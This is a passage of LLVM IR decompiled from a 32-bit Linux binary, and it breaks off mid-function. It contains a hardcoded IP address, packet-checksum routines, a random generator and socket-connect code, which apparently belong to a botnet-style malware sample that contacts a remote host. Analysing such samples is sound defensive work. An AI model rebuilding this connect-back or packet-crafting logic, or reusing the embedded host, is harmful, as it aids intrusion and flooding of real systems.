source_filename = "test"
target datalayout = "e-m:e-p:32:32-f64:32:64-f80:32-n8:16:32-S128"

%_TYPEDEF_sigset_t = type { [1 x i32] }
%tms = type { i32, i32, i32, i32 }
%timespec = type { i32, i32 }
%sigcontext = type { i32 }
%sigaction = type { void (i32)*, i32, void ()*, %_TYPEDEF_sigset_t }
%stat = type { i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32 }
%linux_dirent64 = type { i32 }

@df = internal unnamed_addr global i1 false
@eax = internal unnamed_addr global i32 0
@ecx = internal unnamed_addr global i32 0
@edx = internal unnamed_addr global i32 0
@ebx = internal unnamed_addr global i32 0
@esp = internal unnamed_addr global i32 0
@ebp = internal unnamed_addr global i32 0
@esi = internal unnamed_addr global i32 0
@edi = internal unnamed_addr global i32 0
@0 = external global i32
@global_var_805300c.2 = global i32 0
@global_var_8053024.3 = local_unnamed_addr global i32* @global_var_805300c.2
@global_var_80530d0.5 = local_unnamed_addr global i32 0
@global_var_80530dc.6 = local_unnamed_addr global i32 0
@global_var_80530d4.7 = local_unnamed_addr global i32 0
@global_var_80530d8.8 = local_unnamed_addr global i32 0
@global_var_8053130.9 = local_unnamed_addr global i32 0
@global_var_805310a.10 = local_unnamed_addr global i32 0
@global_var_8053110.11 = local_unnamed_addr global i32 0
@global_var_8053100.12 = global i32 0
@global_var_8053118.14 = local_unnamed_addr global i32 0
@global_var_8053124.15 = local_unnamed_addr global i32 0
@global_var_8053114.16 = global i32 0
@global_var_805317c.17 = local_unnamed_addr global i32 0
@global_var_8053104.18 = local_unnamed_addr global i32 0
@global_var_805315c.19 = local_unnamed_addr global i32 0
@global_var_805310c.20 = local_unnamed_addr global i32 0
@global_var_8053178.21 = local_unnamed_addr global i32 0
@global_var_80523f9.22 = constant [3 x i8] c"\0D\0A\00"
@global_var_80530e0.24 = local_unnamed_addr global i32 0
@global_var_8053128.25 = local_unnamed_addr global i32 0
@global_var_8052382.26 = constant [15 x i8] c"159.89.179.146\00"
@global_var_80531a0.27 = global i32 0
@global_var_8053154.29 = global i32 0
@global_var_80532a0.30 = global i32 0
@global_var_805303c.31 = global i32 0
@global_var_805334c.33 = global i32 0
@global_var_8053350.34 = local_unnamed_addr global i32 0
@global_var_8053354.35 = global i32 0
@global_var_8053360.36 = local_unnamed_addr global i32 0
@global_var_8053654.37 = global i32 0
@global_var_805367c.38 = local_unnamed_addr global i32 0
@global_var_805366c.39 = local_unnamed_addr global i32 0
@global_var_8053670.40 = local_unnamed_addr global i32 0
@global_var_8053674.41 = local_unnamed_addr global i32 0
@global_var_8053678.42 = local_unnamed_addr global i32 0
@global_var_8053684.43 = local_unnamed_addr global i32 0
@global_var_8053690.44 = local_unnamed_addr global i32 0
@global_var_8053688.45 = local_unnamed_addr global i32 0
@global_var_8053694.46 = local_unnamed_addr global i32 0
@global_var_8053668.47 = local_unnamed_addr global i32 0
@global_var_8053664.49 = local_unnamed_addr global i32 0
@global_var_805368c.50 = local_unnamed_addr global i32 0
@global_var_805335c.51 = local_unnamed_addr global i32 0
@global_var_8053054.52 = global i32 0
@global_var_805306c.54 = global i32 0
@global_var_8053138.55 = local_unnamed_addr global i32 0
@global_var_8053000.57 = global i32 -1
@global_var_8051923.58 = constant i32 -294069
@global_var_8053148.59 = local_unnamed_addr global i32 0
@global_var_805314c.60 = local_unnamed_addr global i32 0
@global_var_8052780.61 = constant [10 x i8] c"/dev/null\00"
@global_var_8053144.63 = local_unnamed_addr global i32 0
@global_var_805313c.64 = local_unnamed_addr global i32 0
@global_var_8053140.65 = local_unnamed_addr global i32 0
@global_var_80528a0.67 = constant i32 33554944
@global_var_8051b09.68 = constant i32 1928542531
@global_var_8051b2d.69 = constant i32 1928542531
@global_var_8053158.70 = local_unnamed_addr global i32 0
@global_var_8053088.71 = local_unnamed_addr global i32* @global_var_80528a0.67
@global_var_8053698.72 = local_unnamed_addr global i32 0
@global_var_805369c.73 = local_unnamed_addr global i32 0
@global_var_80530a0.1 = local_unnamed_addr global i8 0
@global_var_8053116.13 = local_unnamed_addr global i16 0
@global_var_805312c.23 = local_unnamed_addr global i16 0
@global_var_8053038.28 = local_unnamed_addr global i16 -1105
@global_var_8053320.32 = global i8 0
@global_var_8053680.48 = local_unnamed_addr global i8 0
@global_var_8053134.53 = local_unnamed_addr global i8 0
@global_var_8053150.62 = local_unnamed_addr global i8 0

declare void @__pseudo_call(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @function_8048094() local_unnamed_addr {
entry:
  %v0_8048097 = load i32, i32* @ebx, align 4
  %v1_8048098 = call i32 @function_80480b0(i32 %v0_8048097)
  %v0_804809d = load i32, i32* @ebx, align 4
  %v1_804809d = add i32 %v0_804809d, 44919
  store i32 %v1_804809d, i32* @ebx, align 4
  %v0_80480a3 = call i32 @function_8048110()
  %v0_80480a8 = call i32 @function_8052340()
  ret i32 %v0_80480a8
}

define i32 @function_80480b0(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @ebx, align 4
  %v0_80480b3 = load i32, i32* @eax, align 4
  ret i32 %v0_80480b3
}

define i32 @function_80480c0() local_unnamed_addr {
dec_label_pc_80480c0:
  %v0_80480c6 = load i8, i8* @global_var_80530a0.1, align 32
  %v1_80480c6 = icmp eq i8 %v0_80480c6, 0
  br i1 %v1_80480c6, label %dec_label_pc_80480db.preheader, label %dec_label_pc_80480c0.dec_label_pc_8048106_crit_edge

dec_label_pc_80480c0.dec_label_pc_8048106_crit_edge: ; preds = %dec_label_pc_80480c0
  %v0_8048107.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_8048106

dec_label_pc_80480db.preheader:                   ; preds = %dec_label_pc_80480c0
  %v0_80480db1 = load i32, i32* bitcast (i32** @global_var_8053024.3 to i32*), align 4
  %v1_80480e22 = icmp eq i32 %v0_80480db1, 0
  %v1_80480e44 = icmp eq i1 %v1_80480e22, false
  br i1 %v1_80480e44, label %dec_label_pc_80480d1.lr.ph, label %dec_label_pc_80480e6

dec_label_pc_80480d1.lr.ph:                       ; preds = %dec_label_pc_80480db.preheader
  br label %dec_label_pc_80480d1

dec_label_pc_80480d1:                             ; preds = %dec_label_pc_80480d1.lr.ph, %dec_label_pc_80480d1
  %v0_80480d1 = phi i32 [ %v0_80480db1, %dec_label_pc_80480d1.lr.ph ], [ %v0_80480db, %dec_label_pc_80480d1 ]
  %v1_80480d1 = add i32 %v0_80480d1, 4
  store i32 %v1_80480d1, i32* bitcast (i32** @global_var_8053024.3 to i32*), align 4
  call void @__pseudo_call(i32 %v0_80480d1)
  %v0_80480db = load i32, i32* bitcast (i32** @global_var_8053024.3 to i32*), align 4
  %v1_80480e2 = icmp eq i32 %v0_80480db, 0
  %v1_80480e4 = icmp eq i1 %v1_80480e2, false
  br i1 %v1_80480e4, label %dec_label_pc_80480d1, label %dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge

dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge: ; preds = %dec_label_pc_80480d1
  br label %dec_label_pc_80480e6

dec_label_pc_80480e6:                             ; preds = %dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge, %dec_label_pc_80480db.preheader
  store i8 1, i8* @global_var_80530a0.1, align 32
  br label %dec_label_pc_8048106

dec_label_pc_8048106:                             ; preds = %dec_label_pc_80480c0.dec_label_pc_8048106_crit_edge, %dec_label_pc_80480e6
  %v0_8048107 = phi i32 [ %v0_8048107.pre, %dec_label_pc_80480c0.dec_label_pc_8048106_crit_edge ], [ 0, %dec_label_pc_80480e6 ]
  ret i32 %v0_8048107

; uselistorder directives
  uselistorder i32 %v0_80480db, { 1, 0 }
  uselistorder i32 %v0_80480d1, { 1, 0 }
  uselistorder i32* bitcast (i32** @global_var_8053024.3 to i32*), { 1, 2, 0 }
  uselistorder i8* @global_var_80530a0.1, { 1, 0 }
  uselistorder label %dec_label_pc_8048106, { 1, 0 }
  uselistorder label %dec_label_pc_80480d1, { 1, 0 }
}

define i32 @function_8048110() local_unnamed_addr {
dec_label_pc_8048110:
  store i32 0, i32* @eax, align 4
  %v0_804811b = call i32 @function_8048120()
  ret i32 %v0_804811b
}

define i32 @function_8048120() local_unnamed_addr {
dec_label_pc_8048120:
  %v0_8048127 = load i32, i32* @eax, align 4
  %v1_8048127 = icmp eq i32 %v0_8048127, 0
  br i1 %v1_8048127, label %dec_label_pc_8048140, label %dec_label_pc_804812b

dec_label_pc_804812b:                             ; preds = %dec_label_pc_8048120
  %v1_8048138 = call i32 @unknown_0(i32 134556320)
  br label %dec_label_pc_8048140

dec_label_pc_8048140:                             ; preds = %dec_label_pc_8048120, %dec_label_pc_804812b
  ret i32 0

; uselistorder directives
  uselistorder label %dec_label_pc_8048140, { 1, 0 }
}

define i32 @entry_point(i8 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %stack_var_4 = alloca i32, align 4
  store i32 0, i32* @ebp, align 4
  %v3_8048166 = sext i8 %arg1 to i32
  store i32 %v3_8048166, i32* @esi, align 4
  %v5_8048166 = ptrtoint i32* %stack_var_4 to i32
  %v0_804816c = load i32, i32* @eax, align 4
  store i32 %v0_804816c, i32* %stack_var_-4, align 4
  %v4_804816c = ptrtoint i32* %stack_var_-4 to i32
  %v0_804816e = load i32, i32* @edx, align 4
  %v11_8048180 = call i32 @function_80519bf(i32 134532960, i32 %v3_8048166, i32* nonnull %stack_var_4, i32 -108, i32 134554470, i32 %v0_804816e, i32 %v4_804816c, i32 %v0_804816c)
  %v4_80481a19 = zext i8 %arg1 to i32
  %v2_80481a5 = icmp eq i8 %arg1, 0
  br i1 %v2_80481a5, label %dec_label_pc_80481d3, label %dec_label_pc_80481b0

dec_label_pc_80481b0:                             ; preds = %entry
  %v3_80481b4 = add i32 %v5_8048166, 4
  %v4_80481b4 = inttoptr i32 %v3_80481b4 to i8*
  %v5_80481b4 = load i8, i8* %v4_80481b4, align 4
  %v16_80481b4 = icmp eq i8 %v5_80481b4, -108
  br i1 %v16_80481b4, label %dec_label_pc_80481db, label %dec_label_pc_80481b9

dec_label_pc_80481b9:                             ; preds = %dec_label_pc_80481b0
  br label %dec_label_pc_80481ce

dec_label_pc_80481c0:                             ; preds = %dec_label_pc_80481ce
  %v1_80481c0 = add i32 %v0_80481c3.in, 12
  %v2_80481c0 = inttoptr i32 %v1_80481c0 to i8*
  %v3_80481c0 = load i8, i8* %v2_80481c0, align 4
  %v4_80481c0 = zext i8 %v3_80481c0 to i32
  %v6_80481c0 = and i32 %v5_80481c0, -256
  %v7_80481c0 = or i32 %v4_80481c0, %v6_80481c0
  %v16_80481c8 = icmp eq i8 %v3_80481c0, -108
  br i1 %v16_80481c8, label %dec_label_pc_80481db, label %dec_label_pc_80481ce

dec_label_pc_80481ce:                             ; preds = %dec_label_pc_80481c0, %dec_label_pc_80481b9
  %v5_80481c0 = phi i32 [ %v7_80481c0, %dec_label_pc_80481c0 ], [ 148, %dec_label_pc_80481b9 ]
  %v0_80481c3.in = phi i32 [ %v0_80481c3, %dec_label_pc_80481c0 ], [ %v5_8048166, %dec_label_pc_80481b9 ]
  %v0_80481ce = phi i32 [ %v1_80481ce, %dec_label_pc_80481c0 ], [ 0, %dec_label_pc_80481b9 ]
  %v0_80481c3 = add i32 %v0_80481c3.in, 8
  %v1_80481ce = add i32 %v0_80481ce, 1
  %v12_80481cf = icmp eq i32 %v1_80481ce, %v4_80481a19
  %v1_80481d1 = icmp eq i1 %v12_80481cf, false
  br i1 %v1_80481d1, label %dec_label_pc_80481c0, label %dec_label_pc_80481d3

dec_label_pc_80481d3:                             ; preds = %dec_label_pc_80481ce, %entry
  ret i32 134554470

dec_label_pc_80481db:                             ; preds = %dec_label_pc_80481c0, %dec_label_pc_80481b0
  %v0_80481db = phi i32 [ %v5_8048166, %dec_label_pc_80481b0 ], [ %v0_80481c3, %dec_label_pc_80481c0 ]
  %v1_80481db = inttoptr i32 %v0_80481db to i32*
  %v2_80481db = load i32, i32* %v1_80481db, align 4
  ret i32 %v2_80481db

; uselistorder directives
  uselistorder i32 %v0_80481c3.in, { 1, 0 }
  uselistorder i32 %v5_8048166, { 2, 0, 1 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i8 %arg1, { 1, 0, 2 }
}

define i32 @function_804bd90() local_unnamed_addr {
dec_label_pc_804bd90:
  %tmp = call i16* @__decompiler_undefined_function_2()
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  %v4_804bd97 = ptrtoint i16* %tmp to i32
  %tmp14 = or i32 %tmp11, 1
  %tmp15 = icmp eq i32 %tmp14, 1
  br i1 %tmp15, label %dec_label_pc_804bdb5, label %dec_label_pc_804bda0

dec_label_pc_804bda0:                             ; preds = %dec_label_pc_804bd90, %dec_label_pc_804bda0
  %v0_804bdae = phi i32 [ %v2_804bdae, %dec_label_pc_804bda0 ], [ 0, %dec_label_pc_804bd90 ]
  %v0_804bda3 = phi i32 [ %v1_804bda3, %dec_label_pc_804bda0 ], [ %tmp11, %dec_label_pc_804bd90 ]
  %v0_804bdab = phi i32 [ %v1_804bdab, %dec_label_pc_804bda0 ], [ %v4_804bd97, %dec_label_pc_804bd90 ]
  %v1_804bda0 = inttoptr i32 %v0_804bdab to i16*
  %v2_804bda0 = load i16, i16* %v1_804bda0, align 2
  %v3_804bda0 = zext i16 %v2_804bda0 to i32
  %v1_804bda3 = add i32 %v0_804bda3, -2
  %v1_804bdab = add i32 %v0_804bdab, 2
  %v2_804bdae = add i32 %v3_804bda0, %v0_804bdae
  %v5_804bdb0 = icmp eq i32 %v1_804bda3, 0
  %v9_804bdb0 = icmp eq i32 %v0_804bda3, 3
  %v2_804bdb3 = or i1 %v9_804bdb0, %v5_804bdb0
  br i1 %v2_804bdb3, label %dec_label_pc_804bdb5, label %dec_label_pc_804bda0

dec_label_pc_804bdb5:                             ; preds = %dec_label_pc_804bda0, %dec_label_pc_804bd90
  %v0_804bdbb = phi i32 [ 0, %dec_label_pc_804bd90 ], [ %v2_804bdae, %dec_label_pc_804bda0 ]
  %v0_804bdb8 = phi i32 [ %v4_804bd97, %dec_label_pc_804bd90 ], [ %v1_804bdab, %dec_label_pc_804bda0 ]
  %v0_804bdb5 = phi i32 [ %tmp11, %dec_label_pc_804bd90 ], [ %v1_804bda3, %dec_label_pc_804bda0 ]
  %v8_804bdb5 = icmp eq i32 %v0_804bdb5, 1
  %v1_804bdb6 = icmp eq i1 %v8_804bdb5, false
  br i1 %v1_804bdb6, label %dec_label_pc_804bdbd, label %dec_label_pc_804bdb8

dec_label_pc_804bdb8:                             ; preds = %dec_label_pc_804bdb5
  %v1_804bdb8 = inttoptr i32 %v0_804bdb8 to i8*
  %v2_804bdb8 = load i8, i8* %v1_804bdb8, align 1
  %v3_804bdb8 = sext i8 %v2_804bdb8 to i32
  %v2_804bdbb = add i32 %v3_804bdb8, %v0_804bdbb
  br label %dec_label_pc_804bdbd

dec_label_pc_804bdbd:                             ; preds = %dec_label_pc_804bdb5, %dec_label_pc_804bdb8
  %v0_804bdbd = phi i32 [ %v0_804bdbb, %dec_label_pc_804bdb5 ], [ %v2_804bdbb, %dec_label_pc_804bdb8 ]
  %v1_804bdbf = urem i32 %v0_804bdbd, 65536
  %v2_804bdc2 = udiv i32 %v0_804bdbd, 65536
  %v2_804bdc6 = add nuw nsw i32 %v1_804bdbf, %v2_804bdc2
  %v2_804bdca = udiv i32 %v2_804bdc6, 65536
  %v2_804bdcd = add nuw nsw i32 %v2_804bdca, %v2_804bdc6
  %v1_804bdcf = urem i32 %v2_804bdcd, 65536
  %v1_804bdd2 = xor i32 %v1_804bdcf, 65535
  ret i32 %v1_804bdd2

; uselistorder directives
  uselistorder i32 %v2_804bdc6, { 1, 0 }
  uselistorder i32 %v0_804bdbb, { 1, 0 }
  uselistorder i32 %v1_804bda3, { 0, 2, 1 }
  uselistorder i32 %v4_804bd97, { 1, 0 }
  uselistorder i32 %tmp11, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804bdbd, { 1, 0 }
  uselistorder label %dec_label_pc_804bda0, { 1, 0 }
}

define i32 @function_804bde0() local_unnamed_addr {
dec_label_pc_804bde0:
  %tmp14 = call i16* @__decompiler_undefined_function_2()
  %tmp15 = call i16 @__decompiler_undefined_function_3()
  %tmp16 = call i32 @__decompiler_undefined_function_0()
  %tmp17 = call i32 @__decompiler_undefined_function_0()
  %v4_804bdf5 = ptrtoint i16* %tmp14 to i32
  %v1_804bdfe = add i32 %tmp17, 12
  %v2_804bdfe = inttoptr i32 %v1_804bdfe to i32*
  %v3_804bdfe = load i32, i32* %v2_804bdfe, align 4
  %v1_804be01 = add i32 %tmp17, 16
  %v2_804be01 = inttoptr i32 %v1_804be01 to i32*
  %v3_804be01 = load i32, i32* %v2_804be01, align 4
  %v7_804be07 = icmp sgt i32 %tmp16, 1
  br i1 %v7_804be07, label %dec_label_pc_804be10, label %dec_label_pc_804be25

dec_label_pc_804be10:                             ; preds = %dec_label_pc_804bde0, %dec_label_pc_804be10
  %v0_804be1e = phi i32 [ %v2_804be1e, %dec_label_pc_804be10 ], [ 0, %dec_label_pc_804bde0 ]
  %v0_804be13 = phi i32 [ %v1_804be13, %dec_label_pc_804be10 ], [ %tmp16, %dec_label_pc_804bde0 ]
  %v0_804be1b = phi i32 [ %v1_804be1b, %dec_label_pc_804be10 ], [ %v4_804bdf5, %dec_label_pc_804bde0 ]
  %v1_804be10 = inttoptr i32 %v0_804be1b to i16*
  %v2_804be10 = load i16, i16* %v1_804be10, align 2
  %v3_804be10 = zext i16 %v2_804be10 to i32
  %v1_804be13 = add i32 %v0_804be13, -2
  %v1_804be1b = add i32 %v0_804be1b, 2
  %v2_804be1e = add i32 %v3_804be10, %v0_804be1e
  %v1_804be20 = add i32 %v0_804be13, -3
  %v6_804be20 = sub i32 2, %v0_804be13
  %v7_804be20 = and i32 %v1_804be13, %v6_804be20
  %v8_804be20 = icmp slt i32 %v7_804be20, 0
  %v9_804be20 = icmp eq i32 %v1_804be20, 0
  %v10_804be20 = icmp slt i32 %v1_804be20, 0
  %v3_804be23 = icmp eq i1 %v10_804be20, %v8_804be20
  %v4_804be23 = icmp eq i1 %v9_804be20, false
  %v5_804be23 = and i1 %v4_804be23, %v3_804be23
  br i1 %v5_804be23, label %dec_label_pc_804be10, label %dec_label_pc_804be25

dec_label_pc_804be25:                             ; preds = %dec_label_pc_804be10, %dec_label_pc_804bde0
  %v0_804be90 = phi i32 [ 0, %dec_label_pc_804bde0 ], [ %v2_804be1e, %dec_label_pc_804be10 ]
  %v0_804be8e = phi i32 [ %v4_804bdf5, %dec_label_pc_804bde0 ], [ %v1_804be1b, %dec_label_pc_804be10 ]
  %v0_804be25 = phi i32 [ %tmp16, %dec_label_pc_804bde0 ], [ %v1_804be13, %dec_label_pc_804be10 ]
  %v8_804be25 = icmp eq i32 %v0_804be25, 1
  br i1 %v8_804be25, label %dec_label_pc_804be8c, label %dec_label_pc_804be28

dec_label_pc_804be28:                             ; preds = %dec_label_pc_804be25, %dec_label_pc_804be8c
  %v0_804be36 = phi i32 [ %v0_804be90, %dec_label_pc_804be25 ], [ %v2_804be90, %dec_label_pc_804be8c ]
  %v2_804be2c = udiv i32 %v3_804be01, 65536
  %v1_804be2f = add i32 %tmp17, 9
  %v2_804be2f = inttoptr i32 %v1_804be2f to i8*
  %v3_804be2f = load i8, i8* %v2_804be2f, align 1
  %v1_804be32 = zext i8 %v3_804be2f to i16
  %v2_804be32 = call i16 @llvm.bswap.i16(i16 %v1_804be32)
  %v3_804be32 = zext i16 %v2_804be32 to i32
  %v2_804be36 = add i32 %v0_804be36, %v2_804be2c
  %v2_804be3e = add i32 %v2_804be36, %v3_804be32
  %v1_804be44 = urem i32 %v3_804bdfe, 65536
  %v2_804be4a = udiv i32 %v3_804bdfe, 65536
  %v1_804be51 = urem i32 %v3_804be01, 65536
  %v4_804be59 = zext i16 %tmp15 to i32
  %v2_804be4d = add nuw nsw i32 %v2_804be4a, %v4_804be59
  %v2_804be57 = add nuw nsw i32 %v2_804be4d, %v1_804be44
  %v2_804be64 = add nuw nsw i32 %v2_804be57, %v1_804be51
  %v2_804be66 = add i32 %v2_804be64, %v2_804be3e
  %tmp = icmp ult i32 %v2_804be66, 65536
  br i1 %tmp, label %dec_label_pc_804be7e, label %dec_label_pc_804be70

dec_label_pc_804be70:                             ; preds = %dec_label_pc_804be28, %dec_label_pc_804be70
  %v2_804be753 = phi i32 [ %v2_804be75, %dec_label_pc_804be70 ], [ %v2_804be66, %dec_label_pc_804be28 ]
  %v2_804be794.in = phi i32 [ %v2_804be75, %dec_label_pc_804be70 ], [ %v2_804be66, %dec_label_pc_804be28 ]
  %v2_804be794 = udiv i32 %v2_804be794.in, 65536
  %v1_804be70 = urem i32 %v2_804be753, 65536
  %v2_804be75 = add nuw nsw i32 %v1_804be70, %v2_804be794
  %tmp25 = icmp ult i32 %v2_804be75, 65536
  %v1_804be7c = icmp eq i1 %tmp25, false
  br i1 %v1_804be7c, label %dec_label_pc_804be70, label %dec_label_pc_804be7e.loopexit

dec_label_pc_804be7e.loopexit:                    ; preds = %dec_label_pc_804be70
  br label %dec_label_pc_804be7e

dec_label_pc_804be7e:                             ; preds = %dec_label_pc_804be7e.loopexit, %dec_label_pc_804be28
  %v0_804be7e = phi i32 [ %v2_804be75, %dec_label_pc_804be7e.loopexit ], [ %v2_804be66, %dec_label_pc_804be28 ]
  %v1_804be7e = urem i32 %v0_804be7e, 65536
  %v1_804be82 = xor i32 %v1_804be7e, 65535
  ret i32 %v1_804be82

dec_label_pc_804be8c:                             ; preds = %dec_label_pc_804be25
  %v1_804be8e = inttoptr i32 %v0_804be8e to i8*
  %v2_804be8e = load i8, i8* %v1_804be8e, align 1
  %v3_804be8e = zext i8 %v2_804be8e to i32
  %v2_804be90 = add i32 %v3_804be8e, %v0_804be90
  br label %dec_label_pc_804be28

; uselistorder directives
  uselistorder i32 %v2_804be75, { 2, 1, 3, 0 }
  uselistorder i32 %v2_804be66, { 3, 0, 2, 1 }
  uselistorder i32 %v1_804be20, { 1, 0 }
  uselistorder i32 %v1_804be13, { 0, 2, 1 }
  uselistorder i32 %v3_804be01, { 1, 0 }
  uselistorder i32 %v4_804bdf5, { 1, 0 }
  uselistorder i32 %tmp17, { 0, 2, 1 }
  uselistorder i32 %tmp16, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804be70, { 1, 0 }
  uselistorder label %dec_label_pc_804be28, { 1, 0 }
  uselistorder label %dec_label_pc_804be10, { 1, 0 }
}

define i32 @function_804d6b0() local_unnamed_addr {
dec_label_pc_804d6b0:
  %v0_804d6b0 = load i32, i32* @global_var_80530d0.5, align 16
  %v0_804d6b8 = load i32, i32* @global_var_80530dc.6, align 4
  %v2_804d6be = mul i32 %v0_804d6b0, 2048
  %v2_804d6c3 = udiv i32 %v0_804d6b8, 524288
  store i32 %v2_804d6c3, i32* @ecx, align 4
  %v2_804d6c6 = xor i32 %v2_804d6be, %v0_804d6b0
  %v0_804d6c8 = load i32, i32* @global_var_80530d4.7, align 4
  store i32 %v0_804d6c8, i32* @global_var_80530d0.5, align 16
  %v0_804d6d2 = load i32, i32* @global_var_80530d8.8, align 8
  store i32 %v0_804d6d2, i32* @global_var_80530d4.7, align 4
  store i32 %v0_804d6b8, i32* @global_var_80530d8.8, align 8
  %v2_804d6e4 = xor i32 %v2_804d6c3, %v0_804d6b8
  %v2_804d6e6 = udiv i32 %v2_804d6c6, 256
  %v2_804d6e9 = xor i32 %v2_804d6e6, %v2_804d6c6
  %v2_804d6eb = xor i32 %v2_804d6e9, %v2_804d6e4
  store i32 %v2_804d6eb, i32* @global_var_80530dc.6, align 4
  ret i32 %v2_804d6eb

; uselistorder directives
  uselistorder i32 %v2_804d6c6, { 1, 0 }
  uselistorder i32 %v2_804d6c3, { 1, 0 }
  uselistorder i32 %v0_804d6b8, { 1, 2, 0 }
  uselistorder i32 %v0_804d6b0, { 1, 0 }
}

define i32 @function_804d8e0() local_unnamed_addr {
dec_label_pc_804d8e0:
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_804d8e0 = load i32, i32* @ebx, align 4
  %v0_804d8e1 = load i32, i32* @eax, align 4
  store i32 %v0_804d8e1, i32* @ebx, align 4
  store i32 0, i32* %stack_var_-20, align 4
  %v1_804d906 = add i32 %v0_804d8e1, 4
  %v2_804d906 = inttoptr i32 %v1_804d906 to i32*
  %v3_804d906 = load i32, i32* %v2_804d906, align 4
  %v10_804d909 = icmp eq i32 %v3_804d906, -1
  br i1 %v10_804d909, label %dec_label_pc_804d8e0.dec_label_pc_804d91a_crit_edge, label %dec_label_pc_804d90e

dec_label_pc_804d8e0.dec_label_pc_804d91a_crit_edge: ; preds = %dec_label_pc_804d8e0
  br label %dec_label_pc_804d91a

dec_label_pc_804d90e:                             ; preds = %dec_label_pc_804d8e0
  %v1_804d912 = call i32 @function_804fab3(i32 %v3_804d906)
  br label %dec_label_pc_804d91a

dec_label_pc_804d91a:                             ; preds = %dec_label_pc_804d8e0.dec_label_pc_804d91a_crit_edge, %dec_label_pc_804d90e
  %v0_804d91a = phi i32 [ -1, %dec_label_pc_804d8e0.dec_label_pc_804d91a_crit_edge ], [ %v1_804d912, %dec_label_pc_804d90e ]
  store i32 %v0_804d91a, i32* %stack_var_-32, align 4
  %v4_804d921 = call i32 @function_8050297(i32 2, i32 1, i32 0, i32 %v0_804d91a)
  %v1_804d929 = load i32, i32* @ebx, align 4
  %v2_804d929 = add i32 %v1_804d929, 4
  %v3_804d929 = inttoptr i32 %v2_804d929 to i32*
  store i32 %v4_804d921, i32* %v3_804d929, align 4
  %v1_804d92c = add i32 %v4_804d921, 1
  %v8_804d92c = icmp eq i32 %v1_804d92c, 0
  br i1 %v8_804d92c, label %dec_label_pc_804d9a3, label %dec_label_pc_804d92f

dec_label_pc_804d92f:                             ; preds = %dec_label_pc_804d91a
  store i32 %v1_804d92c, i32* %stack_var_-32, align 4
  %v0_804d931 = load i32, i32* @ebx, align 4
  %v1_804d931 = add i32 %v0_804d931, 28
  store i32 %v1_804d931, i32* @eax, align 4
  %v1_804d939 = add i32 %v0_804d931, 24
  %v2_804d939 = inttoptr i32 %v1_804d939 to i32*
  store i32 0, i32* %v2_804d939, align 4
  %v0_804d940 = load i32, i32* @eax, align 4
  %v3_804d941 = load i32, i32* %stack_var_-32, align 4
  %v4_804d941 = call i32 @function_804f620(i32 %v0_804d940, i32 256, i32 %v1_804d92c, i32 %v3_804d941)
  %v0_804d949 = load i32, i32* @ebx, align 4
  %v1_804d949 = add i32 %v0_804d949, 4
  %v2_804d949 = inttoptr i32 %v1_804d949 to i32*
  %v3_804d949 = load i32, i32* %v2_804d949, align 4
  %v3_804d951 = call i32 @function_804fa1d(i32 %v3_804d949, i32 3, i32 0)
  %v0_804d959 = load i32, i32* @ebx, align 4
  %v1_804d959 = add i32 %v0_804d959, 4
  %v2_804d959 = inttoptr i32 %v1_804d959 to i32*
  %v3_804d959 = load i32, i32* %v2_804d959, align 4
  %v12_804d95c = or i32 %v3_804d951, 2048
  %v3_804d963 = call i32 @function_804fa1d(i32 %v3_804d959, i32 4, i32 %v12_804d95c)
  %v0_804d968 = load i32, i32* @ebx, align 4
  store i32 2, i32* %stack_var_-20, align 4
  %v0_804d97e = load i32, i32* @global_var_8053130.9, align 16
  %v2_804d983 = add i32 %v0_804d968, 8
  %v3_804d983 = inttoptr i32 %v2_804d983 to i32*
  store i32 %v0_804d97e, i32* %v3_804d983, align 4
  %v2_804d986 = ptrtoint i32* %stack_var_-20 to i32
  %v0_804d98d = load i32, i32* @ebx, align 4
  %v1_804d98d = add i32 %v0_804d98d, 4
  %v2_804d98d = inttoptr i32 %v1_804d98d to i32*
  %v3_804d98d = load i32, i32* %v2_804d98d, align 4
  store i32 %v3_804d98d, i32* %edx.global-to-local, align 4
  %v1_804d990 = add i32 %v0_804d98d, 12
  %v2_804d990 = inttoptr i32 %v1_804d990 to i32*
  store i32 1, i32* %v2_804d990, align 4
  %v0_804d99a = load i32, i32* %edx.global-to-local, align 4
  %v3_804d99b = call i32 @function_80500bc(i32 %v0_804d99a, i32 %v2_804d986, i32 16)
  br label %dec_label_pc_804d9a3

dec_label_pc_804d9a3:                             ; preds = %dec_label_pc_804d91a, %dec_label_pc_804d92f
  %v0_804d9a7 = phi i32 [ %v3_804d99b, %dec_label_pc_804d92f ], [ 0, %dec_label_pc_804d91a ]
  store i32 %v0_804d8e0, i32* @ebx, align 4
  ret i32 %v0_804d9a7

; uselistorder directives
  uselistorder i32 %v3_804d906, { 1, 0 }
  uselistorder i32* %stack_var_-20, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804d9a3, { 1, 0 }
  uselistorder label %dec_label_pc_804d91a, { 1, 0 }
}

define i32 @function_804ddcd() local_unnamed_addr {
dec_label_pc_804ddcd:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  br label %.loopexit

.loopexit:                                        ; preds = %dec_label_pc_804e3b2, %dec_label_pc_804ddcd
  %v0_804ddcd = load i32, i32* @global_var_8053130.9, align 16
  store i32 %v0_804ddcd, i32* @esi, align 4
  %v0_804ddd3 = load i32, i32* @esp, align 4
  %v1_804ddd3 = add i32 %v0_804ddd3, 16
  %v2_804ddd3 = inttoptr i32 %v1_804ddd3 to i32*
  %v3_804ddd3 = load i32, i32* %v2_804ddd3, align 4
